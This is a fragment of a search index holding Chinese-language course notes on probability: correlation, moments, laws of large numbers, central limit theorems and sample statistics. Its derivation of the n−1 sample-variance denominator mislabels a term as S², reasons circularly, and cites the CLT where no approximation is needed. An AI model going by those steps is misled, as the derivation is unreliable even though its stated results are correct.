<p>\u76f8\u5173\u7cfb\u6570\u523b\u753b\u4e86\u968f\u673a\u53d8\u91cf\u4e4b\u95f4\u7684\u7ebf\u6027\u76f8\u5173\u7279\u5f81\uff0c\u4f46\u4e0d\u76f8\u5173\u53ea\u8bf4\u660e\u6ca1\u6709\u7ebf\u6027\u5173\u7cfb\uff0c\u4e0d\u4ee3\u8868\u6ca1\u6709\u975e\u7ebf\u6027\u51fd\u6570\u5173\u7cfb\uff0c\u6545\u800c\u4e00\u822c\u72ec\u7acb\u6027\u4e0e\u4e0d\u76f8\u5173\u4e0d\u7b49\u4ef7. \u4f46\u6b63\u6001\u5206\u5e03\u65f6\uff0c\u72ec\u7acb\u6027\u4e0e\u4e0d\u76f8\u5173\u7b49\u4ef7\uff0c\u5373\u4e0b\u8ff0\u4e8b\u5b9e\uff1a</p> <p>\u8bbe \\((X,Y)\\sim N(\\mu_1,\\mu_2,\\sigma_1^2,.\\sigma^2)\\)\uff0c\u5219\u5176\u72ec\u7acb\u6027\u548c\u4e0d\u76f8\u5173\u6027\u7b49\u4ef7. \u53ea\u56e0 \\(\\text{Corr}(X,Y)=\\rho\\)\uff0c\u800c \\(\\rho=0\\) \u65f6 \\(X,Y\\) \u72ec\u7acb\uff0c\u540c\u65f6 \\(X,Y\\) \u72ec\u7acb\u5f88\u5bb9\u6613\u5c31\u80fd\u6839\u636e\u4e0d\u76f8\u5173\u7684\u7b49\u4ef7\u6761\u4ef6\u5f97\u77e5\u5176\u4e0d\u76f8\u5173.</p>"},{"location":"in_class_learning/semester_3/probability_theory/Ch-4-%E9%9A%8F%E6%9C%BA%E5%8F%98%E9%87%8F%E7%9A%84%E6%95%B0%E5%AD%97%E7%89%B9%E5%BE%81/#_5","title":"\u77e9\u4e0e\u534f\u65b9\u5dee\u9635","text":"<p>\u8bbe X \u662f\u4e00\u4e2a\u968f\u673a\u53d8\u91cf\uff0c\u5bf9\u6b63\u6574\u6570 k\uff0c\u82e5 \\(\\text{E}(|X|^k)&lt;\\infty\\)\uff0c\u5219\u79f0 \\(\\text{E}(X^k)\\) \u4e3a \\(X\\) \u7684 \\(k\\) \u9636\u539f\u70b9\u77e9 \u6216 \\(k\\) \u9636\u77e9\uff1b\u82e5 \\(\\text{E}(|X-\\text{E}X|^k)&lt;\\infty\\)\uff0c\u5219 \\(\\text{E}((X-\\text{E}X)^k)\\) \u4e3a \\(X\\) \u7684 \\(k\\) \u9636\u4e2d\u5fc3\u77e9.</p> <p>\u504f\u5ea6\uff1a\u968f\u673a\u53d8\u91cf\u6807\u51c6\u5316\u540e\u7684\u4e09\u9636\u77e9.</p> <p>\u5cf0\u5ea6\uff1a\u968f\u673a\u53d8\u91cf\u6807\u51c6\u5316\u540e\u7684\u56db\u9636\u77e9.</p> <p>\u5bf9\u4e8e \\(n\\) \u7ef4\u968f\u673a\u5411\u91cf \\(X=(X_1,X_2,\\cdots, X_n)^{\\mathsf{T}}\\)\uff0c\u5b9a\u4e49\u5176\u6570\u5b66\u671f\u671b\u53ca\u534f\u65b9\u5dee\u9635\uff1a</p> \\[ \\text{E}X=(\\text{E}X_1,\\text{E}X_2,\\cdots,\\text{E}X_n)^{\\mathsf{T}} \\] <p>\u79f0\u4e3a \\(X\\) \u7684\u6570\u5b66\u671f\u671b.</p> \\[ \\varSigma=(\\text{Cov}(X_i,X_j))_{n\\times n}= \\begin{bmatrix} \\text{Cov}(X_1,X_1)&amp;\\text{Cov}(X_1,X_2)&amp;\\cdots&amp;\\text{Cov}(X_1,X_n)\\\\ \\text{Cov}(X_2,X_1)&amp;\\text{Cov}(X_2,X_2)&amp;\\cdots&amp;\\text{Cov}(X_2,X_n)\\\\ \\vdots&amp;\\vdots&amp;\\ddots&amp;\\vdots\\\\ \\text{Cov}(X_n,X_1)&amp;\\text{Cov}(X_n,X_2)&amp;\\cdots&amp;\\text{Cov}(X_n,X_n)\\\\ \\end{bmatrix} \\] <p>\u79f0\u4e3a \\(X\\) \u7684\u534f\u65b9\u5dee\u9635\uff0c\u5176\u663e\u7136\u662f\u4e00\u4e2a\u5bf9\u79f0\u9635.</p>"},{"location":"in_class_learning/semester_3/probability_theory/Ch-5-%E6%9E%81%E9%99%90%E7%90%86%E8%AE%BA/","title":"Ch.5 \u6781\u9650\u7406\u8bba","text":""},{"location":"in_class_learning/semester_3/probability_theory/Ch-5-%E6%9E%81%E9%99%90%E7%90%86%E8%AE%BA/#_1","title":"\u5927\u6570\u5b9a\u5f8b","text":"<p>\u4f9d\u6982\u7387\u6536\u655b\uff1a\u8bbe \\(Y_1,Y_2,\\cdots, Y_n, \\cdots\\) \u4e3a\u968f\u673a\u53d8\u91cf\u5e8f\u5217\uff0c\u82e5\u5b58\u5728\u5e38\u6570 \\(a\\)\uff0c\u5bf9\u4efb\u610f\u7ed9\u5b9a\u7684 \\(\\varepsilon &gt; 0\\)\uff0c\u6709\uff1a</p> \\[ \\lim_{n\\to \\infty}\\mathrm{Pr}(|Y_n-a|\\ge \\varepsilon)=0 \\] <p>\u6216\u7b49\u4ef7\u7684</p> \\[ \\lim_{n\\to\\infty}\\mathrm{Pr}(|Y_n-a|&lt;\\varepsilon)=1 \\] <p>\u5219\u79f0\u968f\u673a\u53d8\u91cf\u5e8f\u5217 \\(Y_1,Y_2,\\cdots, Y_n, \\cdots\\) \u4f9d\u6982\u7387\u6536\u655b\u4e8e \\(a\\)\uff0c\u8bb0\u4e3a \\(Y_n\\xrightarrow{P}a\\).</p> <p>\u670d\u4ece\u5927\u6570\u5b9a\u5f8b\uff1a\u8bbe \\(X_1,X_2,\\cdots,X_n,\\cdots\\) \u4e3a\u968f\u673a\u53d8\u91cf\u5e8f\u5217\uff0c\u82e5 \\(\\forall \\varepsilon&gt;0\\)\uff1a</p> \\[ \\lim_{n\\to\\infty}\\mathrm{Pr}\\left(\\left|\\dfrac{1}{n}\\sum_{k=1}^{n}X_k-\\dfrac{1}{n}\\sum_{k=1}^{n}\\mathrm{E}X_k\\right|\\ge \\varepsilon\\right)=0 \\] <p>\u6216\u7b49\u4ef7\u7684</p> \\[ \\lim_{n\\to\\infty}\\mathrm{Pr}\\left(\\left|\\dfrac{1}{n}\\sum_{k=1}^{n}X_k-\\dfrac{1}{n}\\sum_{k=1}^{n}\\mathrm{E}X_k\\right|&lt; \\varepsilon\\right)=1 \\] <p>\u5219\u79f0 \\(\\{X_n\\}\\) \u670d\u4ece\u5927\u6570\u5b9a\u5f8b.</p> <p>\u4ee5\u4e0b\u4ecb\u7ecd\u4e09\u4e2a\u5e38\u7528\u7684\u5927\u6570\u5b9a\u5f8b\uff1a\u5207\u6bd4\u96ea\u592b\u5927\u6570\u5b9a\u5f8b\u3001\u72ec\u7acb\u540c\u5206\u5e03\u5927\u6570\u5b9a\u5f8b\u3001\u4f2f\u52aa\u5229\u5927\u6570\u5b9a\u5f8b.</p> <p>\u5207\u6bd4\u96ea\u592b\u5927\u6570\u5b9a\u5f8b\uff1a\u8bbe \\(X_1,X_2,\\cdots\\) \u4e3a\u4e24\u4e24\u4e0d\u76f8\u5173\u7684\u968f\u673a\u53d8\u91cf\u5e8f\u5217\uff0c\u5176\u65b9\u5dee\u4e00\u81f4\u6709\u754c\uff08\u5373\u5b58\u5728\u5e38\u6570 \\(C\\) \u4f7f\u5f97 \\(\\mathrm{Var}(X_k)&lt;C\\) \u5bf9\u4e00\u5207 \\(k=1,2,\\cdots\\) \u6210\u7acb\uff09\uff0c\u5219 \\(\\{X_n\\}\\) \u670d\u4ece\u5927\u6570\u5b9a\u5f8b.</p> <ul> <li> <p>proof.</p> <p>\u56e0 \\(\\{X_n\\}\\) \u4e24\u4e24\u4e0d\u76f8\u5173\uff0c\u5373 \\(\\mathrm{Cov}(X_i,X_j)=0\\)\uff0c\u6545\uff1a</p> \\[ \\begin{aligned} \\dfrac{1}{n^2}\\mathrm{Var}\\left(\\sum_{k=1}^{n}X_k\\right) &amp;=\\dfrac{1}{n^2}\\left(\\sum_{k=1}^{n}\\mathrm{Var}X_k+2\\sum_{1\\le i&lt;j\\le n}\\mathrm{Cov}(X_i,X_j)\\right)\\\\ &amp;=\\dfrac{1}{n^2}\\sum_{k=1}^{n}\\mathrm{Var}X_k\\\\ &amp;&lt;\\dfrac{1}{n^2}\\times nC\\\\ &amp;=\\dfrac{C}{n}\\to 0 \\end{aligned} \\] <p>\u4e8e\u662f\u6839\u636e\u5207\u6bd4\u96ea\u592b\u4e0d\u7b49\u5f0f\uff1a</p> \\[ \\begin{aligned} 0&amp;\\le \\mathrm{Pr}\\left(\\left|\\dfrac{1}{n}\\sum_{k=1}^{n}X_k-\\dfrac{1}{n}\\sum_{k=1}^{n}\\mathrm{E}X_k\\right|\\ge \\varepsilon\\right)\\\\ &amp;=\\mathrm{Pr}\\left(\\left|\\dfrac{1}{n}\\sum_{k=1}^{n}X_k-\\mathrm{E}\\left(\\dfrac{1}{n}\\sum_{k=1}^{n}X_k\\right)\\right|\\ge \\varepsilon\\right)\\\\ &amp;\\le \\dfrac{1}{\\varepsilon^2}\\mathrm{Var}\\left(\\dfrac{1}{n}\\sum_{k=1}^{n}X_k\\right)\\\\ &amp;=\\dfrac{1}{\\varepsilon^2n^2}\\mathrm{Var}\\left(\\sum_{k=1}^{n}X_k\\right)\\to 0\\\\ \\end{aligned} \\] <p>\u5939\u903c\u51c6\u5219\u7acb\u5f97.</p> </li> </ul> <p>\u72ec\u7acb\u540c\u5206\u5e03\u5927\u6570\u5b9a\u5f8b\uff1a\u8bbe \\(X_1,X_2,\\cdots\\) \u4e3a\u76f8\u4e92\u72ec\u7acb\u4e14\u5206\u5e03\u76f8\u540c\u7684\u968f\u673a\u53d8\u91cf\u5e8f\u5217\uff0c\u6570\u5b66\u671f\u671b\u5b58\u5728\u5e76\u8bb0 \\(\\mathrm{E}X_n=\\mu\\)\uff0c\u5219 \\(\\{X_n\\}\\) \u670d\u4ece\u5927\u6570\u5b9a\u5f8b\uff0c\u5373\uff1a</p> \\[ \\lim_{n\\to \\infty}\\mathrm{Pr}\\left(\\left|\\dfrac{1}{n}\\sum_{k=1}^{n}X_k-\\mu\\right|\\ge \\varepsilon\\right)=0 \\] <p>\u4f2f\u52aa\u5229\u5927\u6570\u5b9a\u5f8b\uff1a\u8bbe \\(n_A\\) \u662f \\(n\\) \u91cd\u4f2f\u52aa\u5229\u8bd5\u9a8c\u4e2d \\(A\\) \u53d1\u751f\u7684\u6b21\u6570\uff0c\\(A\\) \u53d1\u751f\u7684\u6982\u7387\u4e3a \\(p\\)\uff0c\u5219 \\(\\dfrac{n_A}{n}\\xrightarrow{P}p\\).</p>"},{"location":"in_class_learning/semester_3/probability_theory/Ch-5-%E6%9E%81%E9%99%90%E7%90%86%E8%AE%BA/#central-limit-theorem","title":"\u4e2d\u5fc3\u6781\u9650\u5b9a\u7406\uff08Central Limit Theorem\uff09","text":"<p>\u5bf9\u4e8e\u5927\u91cf\u72ec\u7acb\u968f\u673a\u56e0\u7d20\u53e0\u52a0\u800c\u6210\u7684\u968f\u673a\u53d8\u91cf\uff0c\u5176\u4e2d\u6bcf\u4e00\u4e2a\u56e0\u7d20\u7684\u5f71\u54cd\u5f88\u5fae\u5c0f\uff0c\u90a3\u4e48\u8fd9\u6837\u7684\u968f\u673a\u53d8\u91cf\u5c06\u5927\u81f4\u670d\u4ece\u6b63\u6001\u5206\u5e03\uff0c\u4e5f\u5373\uff1a</p> \\[ \\sum_{k=1}^{n}X_k\\overset{\\text{approximately}}\\sim N\\left(\\mathrm{E}\\left(\\sum_{k=1}^{n}X_k\\right),\\mathrm{Var}\\left(\\sum_{k=1}^{n}X_k\\right)\\right) \\] <p>\u6807\u51c6\u5316\u968f\u673a\u53d8\u91cf\uff1a\u6ee1\u8db3 \\(\\mathrm{E}X=0,\\mathrm{Var}X=1\\) \u7684\u968f\u673a\u53d8\u91cf \\(X\\).</p> <p>\u968f\u673a\u53d8\u91cf\u6807\u51c6\u5316\uff1a\\(X^*=\\dfrac{X-\\mathrm{E}X}{\\sqrt{\\mathrm{Var}X}}\\).</p> <p>\u72ec\u7acb\u540c\u5206\u5e03\u4e2d\u5fc3\u6781\u9650\u5b9a\u7406\uff08Lindeberg-Levy CLT\uff09\uff1a\u968f\u673a\u53d8\u91cf\u5e8f\u5217 \\(X_1,X_2,\\cdots,X_n\\) \u72ec\u7acb\u540c\u5206\u5e03\uff0c\u8bb0 \\(\\mathrm{E}X_k=\\mu,\\mathrm{Var}X_k=\\sigma^2,\\sigma&gt;0\\)\uff0c\u5219\u5bf9\u4efb\u610f \\(x\\)\uff0c\u6709\uff1a</p> \\[ \\lim_{n\\to\\infty}\\mathrm{Pr}\\left(\\dfrac{\\sum_{k=1}^{n}X_k-n\\mu}{\\sqrt{n}\\sigma}\\le x\\right)=\\int_{-\\infty}^{x}\\dfrac{1}{\\sqrt{2\\pi}}\\mathrm{e}^{-\\frac{t^2}{2}}\\mathrm{d}t=\\Phi(x) \\] <p>\u62c9\u666e\u62c9\u65af\u4e2d\u5fc3\u6781\u9650\u5b9a\u7406\uff08de Moivre-Laplace theorem\uff09\uff1a\u8bbe \\(\\mu_n\\) \u662f \\(n\\) \u91cd\u4f2f\u52aa\u5229\u8bd5\u9a8c\u4e2d \\(A\\) \u53d1\u751f\u7684\u6b21\u6570\uff0c\u6bcf\u6b21\u8bd5\u9a8c\u4e2d \\(A\\) \u53d1\u751f\u7684\u6982\u7387\u4e3a \\(p,q=1-p\\)\uff0c\u5219\u5bf9\u4efb\u610f \\(x\\) \u6709\uff1a</p> \\[ \\lim_{n\\to\\infty}\\mathrm{Pr}\\left(\\dfrac{\\mu_n-np}{\\sqrt{npq}}\\le x\\right)=\\int_{-\\infty}^{x}\\dfrac{1}{\\sqrt{2\\pi}}\\mathrm{e}^{-\\frac{t^2}{2}}\\mathrm{d}t=\\Phi(x) \\] <p>\u63a8\u8bba\uff1a</p> \\[ \\mathrm{Pr}(a\\le \\mu_n\\le b)=\\Phi\\left(\\dfrac{b-np}{\\sqrt{npq}}\\right)-\\Phi\\left(\\dfrac{a-np}{\\sqrt{npq}}\\right) \\]"},{"location":"in_class_learning/semester_3/probability_theory/Ch-6-%E7%BB%9F%E8%AE%A1%E9%87%8F%E4%B8%8E%E6%8A%BD%E6%A0%B7%E5%88%86%E5%B8%83/","title":"Ch.6 \u7edf\u8ba1\u91cf\u4e0e\u62bd\u6837\u5206\u5e03","text":""},{"location":"in_class_learning/semester_3/probability_theory/Ch-6-%E7%BB%9F%E8%AE%A1%E9%87%8F%E4%B8%8E%E6%8A%BD%E6%A0%B7%E5%88%86%E5%B8%83/#_1","title":"\u603b\u4f53\u4e0e\u6837\u672c","text":"<p>\u5b9a\u4e49\uff1a\u5728\u6570\u7406\u7edf\u8ba1\u4e2d\u6211\u4eec\u5c06\u6240\u7814\u7a76\u7684\u5bf9\u8c61\u7684\u5168\u4f53\u79f0\u4e3a\u603b\u4f53\uff0c\u5c06\u603b\u4f53\u4e2d\u6bcf\u4e2a\u6210\u5458\u79f0\u4e3a\u4e2a\u4f53.</p> <p>\u6837\u672c\uff1a\u4e3a\u4e86\u5bf9\u603b\u4f53 \\(X\\) \u8fdb\u884c\u7814\u7a76\uff0c\u901a\u5e38\u8981\u4ece\u603b\u4f53\u4e2d\u968f\u673a\u5730\u62bd\u53d6\u4e00\u4e9b\u4e2a\u4f53\uff0c\u8fd9\u4e9b\u4e2a\u4f53\u5c31\u79f0\u4e3a\u6837\u672c\uff0c\u62bd\u5f97\u6837\u672c\u7684\u8fc7\u7a0b\u79f0\u4e3a\u62bd\u6837\uff0c\u6837\u672c\u4e2d\u4e2a\u4f53\u7684\u6570\u91cf\u79f0\u4e3a\u6837\u672c\u5bb9\u91cf.</p> <p>\u8bbe\u5bf9\u603b\u4f53\u8fdb\u884c\u4e86 \\(n\\) \u6b21\u89c2\u6d4b\uff0c\u5f97\u5230\u4e00\u7ec4\u6570\u636e \\((x_1, x_2, \\cdots, x_n)\\)\uff0c\u79f0\u5176\u4e3a\u6837\u672c\u89c2\u5bdf\u503c\u6216\u6837\u672c\u503c.</p> <p>\u6837\u672c\u7684\u4e8c\u91cd\u6027\uff1a\u6211\u4eec\u901a\u5e38\u5c06\u6837\u672c\u770b\u6210\u4e00\u7ec4\u6570\uff0c\u901a\u5e38\u7528\u5c0f\u5199\u5b57\u6bcd\u8868\u793a\uff0c\u8bb0\u4e3a \\((x_1, x_2, \\cdots, x_n)\\) \u800c\u5728\u8003\u8651\u4e00\u822c\u95ee\u9898\u65f6\uff0c\u6211\u4eec\u8c08\u5230\u6837\u672c\uff0c\u5f80\u5f80\u5c06\u5176\u770b\u505a\u4e00\u7ec4\u968f\u673a\u53d8\u91cf\uff0c\u901a\u5e38\u7528\u5927\u5199\u5b57\u6bcd\u8868\u793a\uff0c\u8bb0\u4e3a \\((X_1, X_2, \\cdots, X_n)\\).</p> <p>\u7814\u7a76\u8fd9\u4e00\u7ec4\u968f\u673a\u53d8\u91cf\uff0c\u5c31\u8981\u7814\u7a76\u5176\u5206\u5e03\uff0c\u4e3a\u4e86\u4f7f\u6837\u672c\u80fd\u591f\u53cd\u6620\u603b\u4f53\u7684\u7279\u5f81\uff0c\u6211\u4eec\u5bf9\u968f\u673a\u62bd\u6837\u4f5c\u51fa\u5982\u4e0b\u4e24\u70b9\u8981\u6c42\uff1a</p> <p>(1) \u4ee3\u8868\u6027\uff1a\u6837\u672c\u7684\u6bcf\u4e2a\u5206\u91cf \\(X_i\\) \u4e0e\u603b\u4f53 \\(X\\) \u6709\u76f8\u540c\u7684\u5206\u5e03.</p> <p>(2) \u72ec\u7acb\u6027\uff1a\\(X_1, X_2, \\cdots, X_n\\) \u76f8\u4e92\u72ec\u7acb.</p> <p>\u7b80\u5355\u968f\u673a\u6837\u672c\uff1a\u6ee1\u8db3\u4e0a\u8ff0\u4e24\u70b9\u6027\u8d28\u7684\u6837\u672c\u79f0\u4e3a\u7b80\u5355\u968f\u673a\u6837\u672c\uff0c\u4e5f\u901a\u5e38\u7b80\u79f0\u4e3a\u6837\u672c.</p> <p>\u5206\u5e03\u51fd\u6570\uff1a\u8bbe\u603b\u4f53 X \u7684\u5206\u5e03\u51fd\u6570\u4e3a \\(F(x)\\)\uff0c\u5219\u6837\u672c \\((X_1, X_2, \\cdots, X_n)\\) \u7684\u5206\u5e03\u51fd\u6570\u4e3a\uff1a</p> \\[ F(x_1,x_2,\\cdots, x_n)=\\prod_{i=1}^{n}F(x_i) \\] <p>\u6982\u7387\u5bc6\u5ea6\u51fd\u6570\uff1a\u82e5\u603b\u4f53\u662f\u8fde\u7eed\u578b\u968f\u673a\u53d8\u91cf\uff0c\u5176\u6982\u7387\u5bc6\u5ea6\u51fd\u6570\u4e3a \\(p(x)\\)\uff0c\u5219\u6837\u672c \\((X_1, X_2, \\cdots, X_n)\\) \u7684\u6982\u7387\u5bc6\u5ea6\u51fd\u6570\u4e3a\uff1a</p> \\[ p(x_1,x_2,\\cdots,x_n)=\\prod_{i=1}^{n}p(x_i) \\]"},{"location":"in_class_learning/semester_3/probability_theory/Ch-6-%E7%BB%9F%E8%AE%A1%E9%87%8F%E4%B8%8E%E6%8A%BD%E6%A0%B7%E5%88%86%E5%B8%83/#_2","title":"\u7edf\u8ba1\u91cf\u4e0e\u62bd\u6837\u5206\u5e03","text":"<p>\u7edf\u8ba1\u91cf\uff1a\u8bbe \\((X_1, X_2, \\cdots, X_n)\\) \u4e3a\u603b\u4f53 \\(X\\) \u7684\u4e00\u4e2a\u6837\u672c\uff0c\\(T(x_1, x_2, \\cdots, x_n)\\) \u4e3a\u4e0d\u542b\u4efb\u4f55\u672a\u77e5\u53c2\u6570\u7684\u51fd\u6570\uff0c\u5219\u79f0 \\(T(X_1, X_2, \\cdots, X_n)\\) \u4e3a\u4e00\u4e2a\u7edf\u8ba1\u91cf.</p> <p>\u7edf\u8ba1\u91cf\u662f\u6837\u672c\u7684\u51fd\u6570\uff0c\u4f46\u56e0\u7edf\u8ba1\u91cf\u4e2d\u4e0d\u542b\u4efb\u4f55\u672a\u77e5\u91cf\uff0c\u6545\u4e00\u65e6\u6709\u4e86\u6837\u672c\uff0c\u5c31\u53ef\u4ee5\u8ba1\u7b97\u51fa\u7edf\u8ba1\u91cf. \u4e0b\u9762\u4ecb\u7ecd\u4e00\u4e9b\u5e38\u7528\u7684\u7edf\u8ba1\u91cf\uff1a</p> <p>\u8bbe \\((X_1, X_2, \\cdots, X_n)\\) \u4e3a\u603b\u4f53 \\(X\\) \u4e2d\u62bd\u53d6\u7684\u4e00\u4e2a\u6837\u672c\uff0c\u4e0b\u8ff0\u7edf\u8ba1\u91cf\u79f0\u4e3a\u6837\u672c\u5747\u503c\uff1a</p> \\[ \\bar{X}=\\dfrac{1}{n}\\sum_{i=1}^{n}X_i \\] <p>\u4e0b\u8ff0\u7edf\u8ba1\u91cf\u79f0\u4e3a\u6837\u672c\u65b9\u5dee\uff1a</p> \\[ S^2=\\dfrac{1}{n-1}\\sum_{i=1}^{n}(X_i-\\bar{X})^2 \\] <ul> <li> <p>\u8fd9\u91cc\u7684\u5206\u6bcd\u4e3a\u4ec0\u4e48\u662f \\(n-1\\)\uff1f</p> <p>\u8fd9\u662f\u4e3a\u4e86\u4fdd\u8bc1\u65e0\u504f\u6027.</p> <p>\u81ea\u7531\u5ea6\u7684\u89e3\u91ca\uff1a\u6211\u4eec\u5df2\u7ecf\u7528\u5230\u4e86 \\(\\bar{X}\\)\uff0c\u6545\u800c\u786e\u5b9a\u4e86 \\(n-1\\) \u4e2a\u53d8\u91cf\uff0c\u4fbf\u786e\u5b9a\u4e86 \\(n\\) \u4e2a\u53d8\u91cf\uff0c\u6545\u800c\u9664\u4ee5\u81ea\u7531\u5ea6 \\(n-1\\).</p> <p>\u66f4\u8be6\u7ec6\u7684\u65e0\u504f\u6027\u7684\u89e3\u91ca\uff1a\u65e0\u504f\u4f30\u8ba1\uff08unbiased estimator\uff09\u662f\u6307\u5728\u5df2\u77e5\u6837\u672c\u65f6\uff0c\u8fd9\u4e2a\u65e0\u504f\u4f30\u8ba1\u5fc5\u987b\u662f\u6240\u6709\u4f30\u8ba1\u4e2d\u7684\u5e73\u5747\u503c\uff0c\u6362\u53e5\u8bdd\u8bf4\uff0c\u6211\u4eec\u5e94\u5f53\u4fdd\u8bc1 \\(\\mathrm{E}(S^2)=\\sigma^2\\)\uff0c\u5176\u4e2d \\(\\sigma^2\\) \u4e3a\u603b\u4f53\u65b9\u5dee\uff08population variance\uff09\uff0c\u8fd9\u6837 \\(S^2\\) \u5c31\u88ab\u79f0\u4f5c\u662f\u65e0\u504f\u4f30\u8ba1\u7684\u3002</p> <p>\u63a5\u4e0b\u6765\u6211\u4eec\u8fdb\u884c\u63a8\u5bfc\uff0c\u8bbe\u603b\u4f53\u5747\u503c\u4e3a \\(\\mu\\)\uff0c\u603b\u4f53\u65b9\u5dee\u4e3a \\(\\sigma^2\\)\uff0c\u6837\u672c\u5e73\u5747\u4e3a \\(\\bar{x}\\)\uff0c\u6837\u672c\u5bb9\u91cf\u4e3a \\(n\\)\uff0c\u4e8e\u662f\uff1a</p> \\[ \\begin{aligned} \\hat\\sigma^2 &amp;:=\\dfrac{1}{n}\\sum_{i=1}^{n}(x_i-\\bar{x})^2 \\\\ &amp;=\\dfrac{1}{n}\\sum_{i=1}^{n}(x_i-\\mu)^2+\\dfrac{2}{n}\\sum_{i=1}^{n}(x_i-\\mu)(\\mu-\\bar{x})+\\dfrac{1}{n}\\sum_{i=1}^{n}(\\mu-\\bar{x})^2\\\\ &amp;=S^2-\\dfrac{2}{n}\\sum_{i=1}^{n}(\\mu^2-(\\bar{x}+x_i)\\mu+x_i\\bar{x})+n\\times \\dfrac{1}{n}(\\mu-\\bar{x})^2\\\\ &amp;=S^2-2\\mu^2+4\\mu\\bar{x}-2\\bar{x}^2+(\\mu-\\bar{x})^2\\\\ &amp;=S^2-(\\bar{x}-\\mu)^2 \\end{aligned} \\] <p>\u4e24\u8fb9\u53d6\u671f\u671b\u5f97\u5230\uff1a</p> \\[ \\begin{aligned} \\mathrm{E}\\left(\\dfrac{1}{n}\\sum_{i=1}^{n}(x_i-\\bar{x})^2\\right) &amp;=\\mathrm{E}(S^2-(\\bar{x}-\\mu)^2)\\\\ &amp;=\\mathrm{E}(S^2)-\\mathrm{E}((\\bar{x}-\\mu)^2)\\\\ &amp;\\overset{\\text{unbiased}}{=}\\sigma^2-\\mathrm{E}((\\bar{x}-\\mu)^2) \\end{aligned} \\] <p>\u56e0 \\(\\mathrm{E}((\\bar{x}-\\mu)^2)\\) \u662f\u9488\u5bf9\u6240\u6709\u53d6\u6837\u672c\u65f6 \\((\\bar{x}-\\mu)^2\\) \u53d6\u503c\u7684\u5747\u503c\uff0c\u6839\u636e CLT\uff08\u4e2d\u5fc3\u6781\u9650\u5b9a\u7406\uff09\uff0c\u6211\u4eec\u6709 \\(\\bar{x}\\sim N\\left(\\mu, \\dfrac{\\sigma^2}{n}\\right)\\)\uff0c\u6ce8\u610f\uff01\u5404 \\(x_i\\) \u72ec\u7acb\uff0c\u4e14\u5355\u72ec\u4e00\u4e2a\u7684\u65b9\u5dee\u4e3a \\(\\sigma^2\\) \uff0c\u53ef\u4ee5\u4f7f\u7528 CLT. \u4e8e\u662f\u5c31\u76f4\u63a5\u5bfc\u51fa\u4e86\uff1a</p> \\[ \\mathrm{E}((\\bar{x}-\\mu)^2)=\\mathrm{Var}(\\bar{x})=\\dfrac{\\sigma^2}{n} \\] <p>\u6700\u7ec8\u5f97\u5230\uff1a</p> \\[ \\mathrm{E}(\\hat{\\sigma}^2) =\\dfrac{n-1}{n}\\sigma^2\\Leftrightarrow \\mathrm{E}\\left(\\dfrac{n}{n-1}\\hat{\\sigma}^2\\right) =\\sigma^2 \\] <p>\u4e5f\u5c31\u662f</p> \\[ S^2=\\dfrac{n}{n-1}\\hat{\\sigma}^2=\\dfrac{1}{n-1}\\sum_{i=1}^{n}(x_i-\\bar{x})^2 \\] <p>\u5373\u5f97. \u4e0d\u96be\u53d1\u73b0\u8fd9\u4e2a\u5f0f\u5b50\u6210\u7acb\u548c\u65e0\u504f\u8981\u6c42\u53ef\u4e92\u63a8.</p> </li> </ul> <p>\u4e0e\u4e4b\u5bf9\u6bd4\uff0c\u6211\u4eec\u79f0\u4e0b\u8ff0\u7edf\u8ba1\u91cf\u4e3a\u6837\u672c\u4e8c\u9636\u4e2d\u5fc3\u77e9\uff1a</p> \\[ S^{*2}=\\dfrac{1}{n}\\sum_{i=1}^{n}(X_i-\\bar{X})^2 \\] <p>\u4e0b\u8ff0\u7edf\u8ba1\u91cf\u4e3a\u6837\u672c\u6807\u51c6\u5dee\uff1a</p> \\[ S=\\sqrt{\\dfrac{1}{n-1}\\sum_{i=1}^{n}(X_i-\\bar{X})^2} \\] <p>\u4e0b\u8ff0\u7edf\u8ba1\u91cf\u4e3a\u6837\u672c \\(k\\) \u9636\u539f\u70b9\u77e9\uff1a</p> \\[ A_k=\\dfrac{1}{n}\\sum_{i=1}^{n}{X_i}^k,k=1,2,3,\\cdots \\] <p>\u4e0b\u8ff0\u7edf\u8ba1\u91cf\u4e3a\u6837\u672c \\(k\\) \u9636\u4e2d\u5fc3\u77e9\uff1a</p> \\[ B_k=\\dfrac{1}{n}\\sum_{i=1}^{n}(X_i-\\bar{X})^k,k=1,2,3,\\cdots \\] <p>\u6837\u672c\u76f8\u5173\u7cfb\u6570\uff1a</p> \\[ r=\\dfrac{S_{XY}}{S_X^*\\cdot S_Y^*}\\\\ S_{XY}=\\dfrac{1}{n}\\sum_{i=1}^{n}(X_i-\\bar{X})(Y_i-\\bar{Y}) \\] <p>\u56e0\u6837\u672c\u5177\u6709\u4e8c\u91cd\u6027\uff0c\u6545\u800c\u7edf\u8ba1\u91cf\u4f5c\u4e3a\u6837\u672c\u7684\u51fd\u6570\u540c\u6837\u5177\u6709\u4e8c\u91cd\u6027\uff0c\u5373\u5728\u4e00\u6b21\u5177\u4f53\u7684\u89c2\u5bdf\u4e2d\uff0c\u7edf\u8ba1\u91cf\u662f\u5177\u4f53\u7684\u6570\u503c\uff1b\u8131\u79bb\u5177\u4f53\u7684\u89c2\u5bdf\u6216\u8bd5\u9a8c\uff0c\u7edf\u8ba1\u91cf\u5e94\u582a\u79f0\u968f\u673a\u53d8\u91cf. \u7edf\u8ba1\u91cf\u7684\u5206\u5e03\u79f0\u4e3a\u62bd\u6837\u5206\u5e03. \u7814\u7a76\u7edf\u8ba1\u91cf\u7684\u5206\u5e03\u5bf9\u4e8e\u7edf\u8ba1\u63a8\u65ad\u5341\u5206\u91cd\u8981\uff0c\u4e00\u822c\u6765\u8bf4\uff0c\u8981\u786e\u5b9a\u4e00\u4e2a\u7edf\u8ba1\u91cf\u7684\u7cbe\u786e\u5206\u5e03\u5341\u5206\u56f0\u96be\uff0c\u53ea\u6709\u5728\u6b63\u6001\u603b\u4f53\u7684\u60c5\u51b5\u4e0b\uff0c\u6709\u6bd4\u8f83\u597d\u7684\u7ed3\u8bba. 